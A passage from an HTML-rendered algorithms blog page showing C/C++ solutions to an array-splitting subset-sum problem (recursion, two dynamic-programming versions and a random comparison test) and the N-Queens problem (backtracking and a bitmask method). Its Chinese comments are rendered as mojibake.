class="hljs-keyword">if</span> ((arr.size() &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> (picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>)) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// å¦‚æœæ˜¯å¶æ•°ä¸ªå…ƒç´ ï¼ŒæŒ‘é€‰ä¸€åŠ</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> (picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>) || picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// å¦‚æœæ˜¯å¥‡æ•°ä¸ªå…ƒç´ ï¼Œå¯ä»¥æŒ‘é€‰åŠä¸ªæˆ–åŠä¸ª+1</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// é€‰æ‹©ä¸ä½¿ç”¨å½“å‰å…ƒç´ </span><br>    <span class="hljs-type">int</span> p1 = process(arr, i + <span class="hljs-number">1</span>, picks, rest);<br>    <span class="hljs-comment">// é€‰æ‹©ä½¿ç”¨å½“å‰å…ƒç´ </span><br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> next2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;  <span class="hljs-comment">// å¦‚æœå½“å‰å…ƒç´ ä¸è¶…è¿‡å‰©ä½™çš„å®¹é‡</span><br>        next2 = process(arr, i + <span class="hljs-number">1</span>, picks + <span class="hljs-number">1</span>, rest - arr[i]);  <span class="hljs-comment">// ç»§ç»­é€’å½’ï¼ŒæŒ‘é€‰ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (next2 != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// å¦‚æœé€‰æ‹©äº†å½“å‰å…ƒç´ </span><br>        p2 = arr[i] + next2;  <span class="hljs-comment">// åŠ ä¸Šå½“å‰å…ƒç´ çš„å€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> max(p1, p2);  <span class="hljs-comment">// è¿”å›ä¸¤ç§é€‰æ‹©ä¸­çš„æœ€å¤§å€¼</span><br>&#125;<br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’å‡½æ•°1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// å¦‚æœæ•°ç»„ä¸ºç©ºæˆ–è€…åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œè¿”å›0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// è®¡ç®—æ•°ç»„å…ƒç´ çš„æ€»å’Œï¼Œå¹¶è®¡ç®—ç›®æ ‡çš„æœ€å¤§å’Œï¼ˆsum / 2ï¼‰</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// è®¡ç®—ä¸€åŠçš„æ€»å’Œ</span><br><br>    <span class="hljs-type">int</span> N = arr.size();  <span class="hljs-comment">// æ•°ç»„çš„å¤§å°</span><br>    <span class="hljs-type">int</span> M = (arr.size() + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// æœ€å¤§æŒ‘é€‰çš„å…ƒç´ æ•°é‡</span><br><br>    <span class="hljs-comment">// ä½¿ç”¨ä¸‰ç»´DPæ•°ç»„ï¼Œdp[i][j][k]è¡¨ç¤ºä»ç¬¬iä¸ªå…ƒç´ å¼€å§‹ï¼ŒæŒ‘é€‰äº†jä¸ªå…ƒç´ ï¼Œæ€»å’Œä¸ºkçš„æœ€å¤§å€¼</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;(M + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>        dp[N][M][k] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶ï¼šå¦‚æœå·²ç»éå†å®Œæ‰€æœ‰å…ƒç´ ï¼Œä¸”æŒ‘é€‰äº†æœ€å¤§æ•°é‡çš„å…ƒç´ ï¼Œæ€»å’Œä¸ºk</span><br>    &#125;<br><br>    <span class="hljs-comment">// å¦‚æœæ•°ç»„å¤§å°æ˜¯å¥‡æ•°ï¼Œå…è®¸æŒ‘é€‰æ•°é‡ä¸ºM-1çš„æƒ…å†µ</span><br>    <span class="hljs-keyword">if</span> ((arr.size() &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>            dp[N][M - <span class="hljs-number">1</span>][k] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// ä»åå¾€å‰å¡«å……DPæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> picks = <span class="hljs-number">0</span>; picks &lt;= M; picks++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= sum; rest++) &#123;<br>                <span class="hljs-type">int</span> p1 = dp[i + <span class="hljs-number">1</span>][picks][rest];  <span class="hljs-comment">// ä¸é€‰æ‹©å½“å‰å…ƒç´ çš„æƒ…å†µ</span><br>                <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>                <span class="hljs-type">int</span> next2 = <span class="hljs-number">-1</span>;<br>                <span class="hljs-comment">// å¦‚æœå½“å‰å…ƒç´ å¯ä»¥é€‰æ‹©ï¼Œå¹¶ä¸”å‰©ä½™æ•°é‡ç¬¦åˆè¦æ±‚ï¼Œé€‰æ‹©å½“å‰å…ƒç´ </span><br>                <span class="hljs-keyword">if</span> (picks + <span class="hljs-number">1</span> &lt;= M &amp;&amp; arr[i] &lt;= rest) &#123;<br>                    next2 = dp[i + <span class="hljs-number">1</span>][picks + <span class="hljs-number">1</span>][rest - arr[i]];<br>                &#125;<br>                <span class="hljs-keyword">if</span> (next2 != <span class="hljs-number">-1</span>) &#123;<br>                    p2 = arr[i] + next2;  <span class="hljs-comment">// åŠ ä¸Šå½“å‰å…ƒç´ çš„å€¼</span><br>                &#125;<br>                dp[i][picks][rest] = max(p1, p2);  <span class="hljs-comment">// é€‰æ‹©æœ€å¤§å€¼</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][sum];  <span class="hljs-comment">// è¿”å›ç»“æœ</span><br>&#125;<br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’å‡½æ•°2</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// å¦‚æœæ•°ç»„ä¸ºç©ºæˆ–è€…åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œè¿”å›0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// è®¡ç®—æ•°ç»„å…ƒç´ çš„æ€»å’Œï¼Œå¹¶è®¡ç®—ç›®æ ‡çš„æœ€å¤§å’Œï¼ˆsum / 2ï¼‰</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// è®¡ç®—ä¸€åŠçš„æ€»å’Œ</span><br>    <span class="hljs-type">int</span> N = arr.size();  <span class="hljs-comment">// æ•°ç»„çš„å¤§å°</span><br>    <span class="hljs-type">int</span> M = (arr.size() + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// æœ€å¤§æŒ‘é€‰çš„å…ƒç´ æ•°é‡</span><br>    <span class="hljs-comment">// ä½¿ç”¨ä¸‰ç»´DPæ•°ç»„ï¼Œdp[i][j][k]è¡¨ç¤ºä»ç¬¬iä¸ªå…ƒç´ å¼€å§‹ï¼ŒæŒ‘é€‰äº†jä¸ªå…ƒç´ ï¼Œæ€»å’Œä¸ºkçš„æœ€å¤§å€¼</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;(M + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, INT_MIN)));<br>    <span class="hljs-comment">// åˆå§‹åŒ–DPæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>            dp[i][<span class="hljs-number">0</span>][k] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æŒ‘é€‰å…ƒç´ ï¼Œå’Œä¸º0</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€ä¸ªå…ƒç´ çš„æƒ…å†µ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>][k] = (arr[<span class="hljs-number">0</span>] &lt;= k ? arr[<span class="hljs-number">0</span>] : INT_MIN);<br>    &#125;<br>    <span class="hljs-comment">// å¡«å……DPæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= min(i + <span class="hljs-number">1</span>, M); j++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>                dp[i][j][k] = dp[i - <span class="hljs-number">1</span>][j][k];  <span class="hljs-comment">// ä¸é€‰æ‹©å½“å‰å…ƒç´ çš„æƒ…å†µ</span><br>                <span class="hljs-keyword">if</span> (k - arr[i] &gt;= <span class="hljs-number">0</span>) &#123;<br>                    dp[i][j][k] = max(dp[i][j][k], dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>][k - arr[i]] + arr[i]);  <span class="hljs-comment">// é€‰æ‹©å½“å‰å…ƒç´ </span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(dp[N - <span class="hljs-number">1</span>][M][sum], dp[N - <span class="hljs-number">1</span>][N - M][sum]);  <span class="hljs-comment">// è¿”å›æœ€å¤§å€¼</span><br>&#125;<br><span class="hljs-comment">// å°è£…çš„é€’å½’æ–¹æ³•ï¼Œç”¨æ¥é€‰æ‹©å­æ•°ç»„çš„å…ƒç´ ï¼Œä½¿å¾—æ€»å’Œå°½é‡æ¥è¿‘sum / 2</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// å¦‚æœæ•°ç»„ä¸ºç©ºæˆ–è€…åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œè¿”å›0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// è®¡ç®—æ€»å’Œ</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(arr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sum &gt;&gt; <span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨é€’å½’å‡½æ•°</span><br>&#125;<br><br><br><span class="hljs-comment">// éšæœºç”Ÿæˆä¸€ä¸ªæ•°ç»„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> maxLen = <span class="hljs-number">10</span>;  <span class="hljs-comment">// æœ€å¤§æ•°ç»„é•¿åº¦</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> maxValue = <span class="hljs-number">50</span>;  <span class="hljs-comment">// æ•°ç»„ä¸­å…ƒç´ çš„æœ€å¤§å€¼</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> testTime = <span class="hljs-number">10000</span>;  <span class="hljs-comment">// æµ‹è¯•æ¬¡æ•°</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % maxLen;  <span class="hljs-comment">// éšæœºç”Ÿæˆæ•°ç»„é•¿åº¦</span><br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, maxValue);  <span class="hljs-comment">// ç”Ÿæˆéšæœºæ•°ç»„</span><br><br>        <span class="hljs-type">int</span> ans1 = right(arr);  <span class="hljs-comment">// ä½¿ç”¨é€’å½’æ–¹æ³•è®¡ç®—ç»“æœ</span><br>        <span class="hljs-type">int</span> ans2 = dp1(arr);  <span class="hljs-comment">// ä½¿ç”¨åŠ¨æ€è§„åˆ’æ–¹æ³•1è®¡ç®—ç»“æœ</span><br>        <span class="hljs-type">int</span> ans3 = dp2(arr);  <span class="hljs-comment">// ä½¿ç”¨åŠ¨æ€è§„åˆ’æ–¹æ³•2è®¡ç®—ç»“æœ</span><br><br>        <span class="hljs-comment">// å¦‚æœä¸‰ç§æ–¹æ³•è¿”å›çš„ç»“æœä¸ä¸€è‡´ï¼Œè¾“å‡ºæ•°ç»„å’Œç»“æœ</span><br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;right: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp1: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp2: &quot;</span> &lt;&lt; ans3 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•ç»“æŸ&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Nçš‡å"><a href="#Nçš‡å" class="headerlink" title="Nçš‡å"></a>Nçš‡å</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// æ–¹æ³• 1ï¼šä½¿ç”¨é€’å½’å›æº¯æ±‚è§£ N çš‡åé—®é¢˜</span><br><span class="hljs-comment">// è¿”å›æ‰€æœ‰åˆæ³•çš„æ”¾ç½®æ–¹æ³•æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">num1</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœ n å°äº 1ï¼Œç›´æ¥è¿”å› 0</span><br>    &#125;<br>    <span class="hljs-comment">// åˆ›å»ºè®°å½•çš‡åä½ç½®çš„æ•°ç»„ï¼Œrecord[i] = j è¡¨ç¤ºç¬¬ i è¡Œçš„çš‡åæ”¾ç½®åœ¨ç¬¬ j åˆ—</span><br>    <span class="hljs-type">int</span> record[n];<br>    <span class="hljs-keyword">return</span> process1(<span class="hljs-number">0</span>, record, n);  <span class="hljs-comment">// ä»ç¬¬ 0 è¡Œå¼€å§‹é€’å½’</span><br>&#125;<br><br><span class="hljs-comment">// é€’å½’å‡½æ•°ï¼Œå¤„ç†ç¬¬ i è¡Œçš„çš‡åæ”¾ç½®</span><br><span class="hljs-comment">// i è¡¨ç¤ºå½“å‰å¤„ç†çš„è¡Œï¼Œrecord æ•°ç»„è®°å½•æ¯ä¸€è¡Œçš‡åçš„ä½ç½®ï¼Œn ä¸ºçš‡åçš„æ•°é‡</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> record[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == n) &#123;  <span class="hljs-comment">// å¦‚æœå·²ç»æ”¾ç½®å®Œæ‰€æœ‰çš‡åï¼Œè¯´æ˜æ˜¯ä¸€ç§åˆæ³•è§£</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç”¨äºç´¯åŠ åˆæ³•è§£çš„æ•°é‡</span><br>    <span class="hljs-comment">// éå†å½“å‰è¡Œ i çš„æ‰€æœ‰åˆ—ï¼Œå°è¯•å°†çš‡åæ”¾ç½®åœ¨ä¸åŒçš„åˆ— j</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">if</span> (isValid(record, i, j)) &#123;  <span class="hljs-comment">// å¦‚æœæ”¾ç½®åœ¨ (i, j) ä½ç½®åˆæ³•</span><br>            record[i] = j;  <span class="hljs-comment">// å°†çš‡åæ”¾ç½®åœ¨ (i, j) ä½ç½®</span><br>            res += process1(i + <span class="hljs-number">1</span>, record, n);  <span class="hljs-comment">// é€’å½’æ”¾ç½®ä¸‹ä¸€è¡Œçš„çš‡å</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥å½“å‰æ”¾ç½®åœ¨ (i, j) ä½ç½®çš„çš‡åæ˜¯å¦ä¸ä¹‹å‰çš„çš‡åå†²çª</span><br><span class="hljs-comment">// record æ•°ç»„è®°å½•æ¯ä¸€è¡Œçš‡åçš„ä½ç½®</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isValid</span><span class="hljs-params">(<span class="hljs-type">int</span> record[], <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-comment">// æ£€æŸ¥ 0..i-1 è¡Œä¸­çš„æ¯ä¸€ä¸ªçš‡åæ˜¯å¦å’Œ (i, j) å†²çª</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; i; k++) &#123;<br>        <span class="hljs-keyword">if</span> (j == record[k] || <span class="hljs-built_in">abs</span>(record[k] - j) == <span class="hljs-built_in">abs</span>(i - k)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// å¦‚æœåŒåˆ—æˆ–è€…åŒå¯¹è§’çº¿ï¼Œè¿”å› false</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å†²çªï¼Œè¿”å› true</span><br>&#125;<br><br><span class="hljs-comment">// æ–¹æ³• 2ï¼šä½¿ç”¨ä½è¿ç®—ä¼˜åŒ– N çš‡åé—®é¢˜</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">num2</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span> || n &gt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœ n å°äº 1 æˆ–è€…å¤§äº 32ï¼Œè¿”å› 0</span><br>    &#125;<br>    <span class="hljs-comment">// limit: 32 ä½çš„å…¨ 1ï¼Œç”¨äºè¡¨ç¤ºæ¯åˆ—æ˜¯å¦å¯ç”¨ï¼Œæœ€å¤šæ”¯æŒ 32 çš‡åé—®é¢˜</span><br>    <span class="hljs-type">int</span> limit = (n == <span class="hljs-number">32</span>) ? <span class="hljs-number">-1</span> : (<span class="hljs-number">1</span> &lt;&lt; n) - <span class="hljs-number">1</span>;  <span class="hljs-comment">// è®¡ç®—åˆ—å¯ç”¨çš„ä½æ©ç </span><br>    <span class="hljs-keyword">return</span> process2(limit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// è°ƒç”¨ä½è¿ç®—çš„é€’å½’æ–¹æ³•</span><br>&#125;<br><br><span class="hljs-comment">// ä½è¿ç®—é€’å½’æ–¹æ³•</span><br><span class="hljs-comment">// limit: é™åˆ¶åˆ—çš„æ©ç ï¼ŒcolLim: å·²ç»è¢«å ç”¨çš„åˆ—ï¼ŒleftDiaLim: å·²ç»è¢«å ç”¨çš„å·¦ä¸‹å¯¹è§’çº¿ï¼ŒrightDiaLim: å·²ç»è¢«å ç”¨çš„å³ä¸‹å¯¹è§’çº¿</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">int</span> limit, <span class="hljs-type">int</span> colLim, <span class="hljs-type">int</span> leftDiaLim, <span class="hljs-type">int</span> rightDiaLim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (colLim == limit) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å¦‚æœæ‰€æœ‰åˆ—éƒ½è¢«å ç”¨ï¼Œè¯´æ˜å·²ç»æ”¾ç½®å®Œæ‰€æœ‰çš‡å</span><br>    &#125;<br>    <span class="hljs-comment">// pos: å½“å‰å¯ä»¥æ”¾ç½®çš‡åçš„æ‰€æœ‰ä½ç½®ï¼Œå– limit - colLim - leftDiaLim - rightDiaLim</span><br>    <span class="hljs-type">int</span> pos = limit &amp; (~(colLim | leftDiaLim | rightDiaLim));  <span class="hljs-comment">// å¯ä»¥æ”¾ç½®çš‡åçš„åˆ—</span><br>    <span class="hljs-type">int</span> mostRightOne = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç”¨äºç´¯åŠ åˆæ³•è§£çš„æ•°é‡</span><br>    <span class="hljs-keyword">while</span> (pos != <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// å¤„ç†å½“å‰å¯ä»¥æ”¾ç½®çš‡åçš„åˆ—</span><br>        <span class="hljs-comment">// å– pos ä¸­æœ€å³è¾¹çš„ 1 ä½œä¸ºè¦æ”¾ç½®çš‡åçš„ä½ç½®</span><br>        mostRightOne = pos &amp; (~pos + <span class="hljs-number">1</span>);<br>        pos = pos - mostRightOne;  <span class="hljs-comment">// å°† pos ä¸­è¯¥ä½ç½®æ¸…é›¶ï¼Œå‡†å¤‡å¤„ç†ä¸‹ä¸€ä¸ªä½ç½®</span><br>        <span class="hljs-comment">// é€’å½’æ”¾ç½®çš‡å</span><br>        res += process2(limit, colLim | mostRightOne, (leftDiaLim | mostRightOne) &lt;&lt; <span class="hljs-number">1</span>, (rightDiaLim | mostRightOne) 